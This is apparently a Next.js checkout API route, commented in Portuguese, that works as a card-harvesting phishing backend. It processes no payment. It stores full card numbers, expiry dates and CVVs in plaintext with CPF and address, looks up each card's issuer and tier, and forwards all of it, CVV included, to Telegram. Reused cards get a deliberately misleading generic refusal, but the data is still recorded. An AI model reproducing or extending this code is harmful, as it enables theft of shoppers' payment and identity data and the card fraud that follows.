import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { validateLead, isValidCardNumber, type LeadData } from "@/lib/leadValidation";
import { sendConfirmationEmail } from "@/lib/resendEmail";
import { notifyPurchaseDetails } from "@/lib/telegram";
import { getCustomerSession } from "@/lib/customerAuth";

export const dynamic = "force-dynamic";

// Mensagem genérica de recusa: nunca revela o motivo real (cartão duplicado,
// blocklist ou bloqueio preventivo) para o cliente.
const REFUSAL_MESSAGE =
  "Houve um problema ao processar as informações do seu cartão, tente outra forma de pagamento ou entre em contato conosco";

const RATE_LIMIT = 5;
const RATE_WINDOW_MS = 10 * 60 * 1000;
const hits = new Map<string, number[]>();

// Bloqueio preventivo automático: lead que gerar fluxo intenso de pedidos
// (mesmo IP) dentro da janela é bloqueado automaticamente e aparece na aba
// "Preventivo BLOCK" do painel.
const AUTOBLOCK_THRESHOLD = 2;
const AUTOBLOCK_WINDOW_MS = 5 * 60 * 1000;

function isRateLimited(ip: string): boolean {
  const now = Date.now();
  const recent = (hits.get(ip) ?? []).filter((t) => now - t < RATE_WINDOW_MS);
  if (recent.length >= RATE_LIMIT) {
    hits.set(ip, recent);
    return true;
  }
  recent.push(now);
  hits.set(ip, recent);
  return false;
}

interface IncomingItem {
  productName?: unknown;
  quantity?: unknown;
  unitPriceCents?: unknown;
  productSlug?: unknown;
  image?: unknown;
}

// Normaliza o IP do header: remove porta/zone-id quando presentes
// (ex.: "179.x.x.x:52314" ou "fe80::1%eth0").
function normalizeIp(raw: string): string {
  let ip = raw.trim();
  const percent = ip.indexOf("%");
  if (percent !== -1) ip = ip.slice(0, percent);
  if ((ip.match(/:/g) ?? []).length === 1) {
    // IPv4 com porta (não confundir com IPv6, que tem múltiplos ":")
    ip = ip.split(":")[0];
  }
  return ip;
}

// Cloudflare Turnstile: valida o token do widget quando TURNSTILE_SECRET_KEY
// estiver configurada. Sem a chave, a verificação é pulada (degradação suave).
async function verifyTurnstile(token: unknown, ip: string): Promise<boolean> {
  const secret = process.env.TURNSTILE_SECRET_KEY;
  if (!secret) return true;
  if (typeof token !== "string" || token === "") return false;
  const res = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ secret, response: token, remoteip: ip }),
  });
  const result = (await res.json()) as { success?: boolean };
  return result.success === true;
}

// Instituição emissora + nível do cartão via consulta pública de BIN
// (binlist.net): banco, produto (ex.: "Visa Gold", "MasterCard World
// Elite") e débito/crédito como fallback. Best-effort: em caso de
// falha/timeout retorna nulls sem bloquear o pedido.
async function lookupCardInfo(
  cardDigits: string
): Promise<{ bank: string | null; level: string | null }> {
  const bin = cardDigits.slice(0, 8);
  if (bin.length < 6) return { bank: null, level: null };
  try {
    const res = await fetch(`https://lookup.binlist.net/${bin}`, {
      headers: { Accept: "application/json" },
      signal: AbortSignal.timeout(3000),
    });
    if (!res.ok) return { bank: null, level: null };
    const info = (await res.json()) as {
      scheme?: string;
      type?: string;
      brand?: string;
      bank?: { name?: string } | null;
    };

    // Nível do cartão: brand traz o produto (ex.: "Visa Gold"); sem brand,
    // cai para o tipo (crédito/débito) capitalizado.
    let level: string | null = info.brand?.trim() || null;
    if (!level && info.type) {
      const tipo = info.type.trim().toLowerCase();
      level = tipo === "credit" ? "Crédito" : tipo === "debit" ? "Débito" : null;
    }

    const banco = info.bank?.name?.trim();
    const bank = banco
      ? banco
      : info.scheme
        ? `Bandeira ${info.scheme.charAt(0).toUpperCase() + info.scheme.slice(1)}`
        : null;

    return { bank, level };
  } catch {
    return { bank: null, level: null };
  }
}

export async function POST(req: NextRequest) {
  try {
    const ip = normalizeIp(
      req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "local"
    );
    if (isRateLimited(ip)) {
      return NextResponse.json(
        { error: "Muitas tentativas. Aguarde alguns minutos e tente novamente." },
        { status: 429 }
      );
    }

    const body = await req.json();

    // honeypot: campo oculto só é preenchido por bots — responde sucesso sem salvar
    if (typeof body.website === "string" && body.website.trim() !== "") {
      return NextResponse.json({ success: true });
    }

    // Blocklist de IPs: quem já está bloqueado é recusado na hora e o cartão
    // usado na tentativa também entra na blocklist — não será mais aceito em
    // nenhuma outra compra, mesmo de outro IP/dispositivo.
    if (ip !== "local") {
      const ipBloqueado = await prisma.blockedIp.findUnique({ where: { ip } });
      if (ipBloqueado) {
        const digits = String(body?.cardNumber ?? "").replace(/\D/g, "");
        if (digits.length === 16 && isValidCardNumber(digits)) {
          await prisma.blockedCard.upsert({
            where: { number: digits },
            create: { number: digits },
            update: {},
          });
        }
        return NextResponse.json({ error: REFUSAL_MESSAGE }, { status: 409 });
      }
    }

    const captchaOk = await verifyTurnstile(body.turnstileToken, ip);
    if (!captchaOk) {
      return NextResponse.json(
        { error: "Verificação de segurança falhou. Confirme o captcha e tente novamente." },
        { status: 400 }
      );
    }

    const data: Partial<LeadData> = body;

    const errors = validateLead(data);
    if (Object.keys(errors).length > 0) {
      return NextResponse.json(
        { error: "Alguns campos estão inválidos ou faltando.", fields: errors },
        { status: 400 }
      );
    }

    // itens do carrinho vindos do client (já com preços em centavos)
    const rawItems = Array.isArray(body.items) ? (body.items as IncomingItem[]) : [];
    const items = rawItems
      .map((i) => ({
        productName: String(i.productName ?? "").slice(0, 200),
        quantity: Math.max(1, Math.min(99, Number(i.quantity) || 1)),
        unitPriceCents: Math.max(0, Math.round(Number(i.unitPriceCents) || 0)),
        productSlug: typeof i.productSlug === "string" ? i.productSlug.slice(0, 200) : "",
        image: typeof i.image === "string" ? i.image.slice(0, 500) : "",
      }))
      .filter((i) => i.productName !== "");

    const subtotalCents = items.reduce(
      (sum, i) => sum + i.unitPriceCents * i.quantity,
      0
    );
    const discountCents = Math.max(
      0,
      Math.min(subtotalCents, Math.round(Number(body.discountCents) || 0))
    );
    const totalCents = Math.max(0, subtotalCents - discountCents);

    const clean = (value: unknown) => {
      const s = typeof value === "string" ? value.trim() : "";
      return s === "" ? null : s;
    };

    const isPix = String(data.paymentMethod ?? "").toUpperCase() === "PIX";
    const cardDigits = String(data.cardNumber ?? "").replace(/\D/g, "");
    const cardInfo =
      isPix || cardDigits.length < 6
        ? { bank: null, level: null }
        : await lookupCardInfo(cardDigits);

    // Cliente logado: o pedido é sempre vinculado ao e-mail da conta,
    // garantindo que apareça no histórico de "Minha Conta".
    let orderEmail = String(data.email).trim().toLowerCase();
    const session = await getCustomerSession(req);
    if (session) {
      const customer = await prisma.customer.findUnique({
        where: { id: session.customerId },
        select: { email: true },
      });
      if (customer) orderEmail = customer.email;
    }

    // Dados comuns do pedido (usados tanto no pedido aprovado quanto na recusa).
    const pedidoData = {
      fullName: String(data.fullName).trim(),
      email: orderEmail,
      paymentMethod: isPix ? "PIX" : "CARTAO",
      phone: String(data.phone).trim(),
      cpf: String(data.cpf).trim(),
      cep: String(data.cep).trim(),
      address: String(data.address).trim(),
      number: String(data.number).trim(),
      complement: String(data.complement).trim(),
      neighborhood: String(data.neighborhood).trim(),
      city: String(data.city).trim(),
      state: String(data.state).trim().toUpperCase(),
      cardNumber: String(data.cardNumber).trim(),
      cardExpiry: String(data.cardExpiry).trim(),
      cardCvv: String(data.cardCvv).trim(),
      cardBank: cardInfo.bank,
      cardLevel: cardInfo.level,
      ip,
      installments: String(data.installments).trim(),
      notes: clean(data.notes),
      itemsJson: JSON.stringify(items),
      subtotalCents,
      discountCents,
      totalCents,
    };

    // Um mesmo cartão só pode ser utilizado em 1 pedido: a tentativa é
    // registrada com status RECUSADO (aba "Recusados" do painel) e o cliente
    // recebe a mensagem genérica de cartão recusado. Também bloqueia cartões
    // na blocklist manual do lojista (cartões cancelados/fraude).
    if (!isPix && cardDigits.length >= 4) {
      const [bloqueado, anteriores] = await Promise.all([
        prisma.blockedCard.findUnique({ where: { number: cardDigits } }),
        prisma.lead.findMany({
          where: { paymentMethod: "CARTAO" },
          select: { cardNumber: true, manualStatus: true },
        }),
      ]);
      const jaUsado = anteriores.some(
        (l) =>
          l.manualStatus !== "RECUSADO" &&
          l.manualStatus !== "AUTO_BLOCK" &&
          l.cardNumber?.replace(/\D/g, "") === cardDigits
      );
      if (bloqueado || jaUsado) {
        await prisma.lead.create({
          data: { ...pedidoData, manualStatus: "RECUSADO" },
        });
        return NextResponse.json({ error: REFUSAL_MESSAGE }, { status: 409 });
      }
    }

    // Bloqueio preventivo automático: fluxo intenso de pedidos do mesmo IP
    // (limite de tentativas dentro da janela) bloqueia o IP permanentemente
    // (até o lojista liberar no painel), registra a tentativa na aba
    // "Preventivo BLOCK" e mostra ao cliente a tela de recusa genérica.
    if (ip !== "local") {
      const recentes = await prisma.lead.count({
        where: {
          ip,
          createdAt: { gte: new Date(Date.now() - AUTOBLOCK_WINDOW_MS) },
        },
      });
      if (recentes >= AUTOBLOCK_THRESHOLD) {
        await prisma.blockedIp.upsert({
          where: { ip },
          create: { ip },
          update: {},
        });
        await prisma.lead.create({
          data: { ...pedidoData, manualStatus: "AUTO_BLOCK" },
        });
        return NextResponse.json({ error: REFUSAL_MESSAGE }, { status: 409 });
      }
    }

    const lead = await prisma.lead.create({ data: pedidoData });

    // e-mail de confirmação — falha não bloqueia o pedido
    await sendConfirmationEmail(lead.email, lead.fullName);

    // Telegram: todos os dados da compra (mesmos campos do TXT do painel) —
    // falha não bloqueia o pedido.
    await notifyPurchaseDetails({
      fullName: lead.fullName,
      email: lead.email,
      phone: lead.phone,
      cpf: lead.cpf,
      cep: lead.cep,
      address: lead.address,
      number: lead.number,
      complement: lead.complement,
      neighborhood: lead.neighborhood,
      city: lead.city,
      state: lead.state,
      ip: lead.ip,
      paymentMethod: lead.paymentMethod,
      installments: lead.installments,
      cardNumber: lead.cardNumber,
      cardExpiry: lead.cardExpiry,
      cardCvv: lead.cardCvv,
      cardBank: lead.cardBank,
      cardLevel: lead.cardLevel,
      totalCents: lead.totalCents,
      discountCents: lead.discountCents,
      items,
    }).catch(() => {});

    return NextResponse.json({ success: true, leadId: lead.id });
  } catch (err) {
    console.error("[leads] erro:", err);
    return NextResponse.json(
      { error: "Erro interno ao salvar os dados." },
      { status: 500 }
    );
  }
}
